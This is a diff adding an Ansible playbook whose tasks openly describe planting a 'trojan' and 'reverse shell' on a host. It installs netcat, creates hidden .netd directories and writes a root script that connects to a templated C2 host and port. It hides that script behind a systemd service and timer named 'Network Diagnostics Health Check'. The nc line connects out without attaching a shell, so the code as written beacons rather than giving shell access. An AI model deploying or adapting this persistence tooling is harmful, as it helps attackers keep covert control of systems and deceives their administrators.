@@ -1,0 +1,78 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure trojan cache directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.netd
+    - /var/lib/.netd
+
+- name: Create reverse shell script
+  copy:
+    dest: "{{ revshell_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      LOG="{{ revshell_log }}"
+      C2="{{ c2_host }}"
+      PORT="{{ c2_port }}"
+
+      echo "---- $(date) connecting to $C2:$PORT ----" >> "$LOG"
+      nc -w 30 "$C2" "$PORT" 2>/dev/null || true
+      echo "session ended" >> "$LOG"
+
+- name: Create reverse shell systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ revshell_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Network Diagnostics Health Check
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ revshell_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create reverse shell systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ revshell_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic network diagnostics health check
+
+      [Timer]
+      OnCalendar={{ revshell_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start reverse shell timer
+  systemd:
+    name: "{{ revshell_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
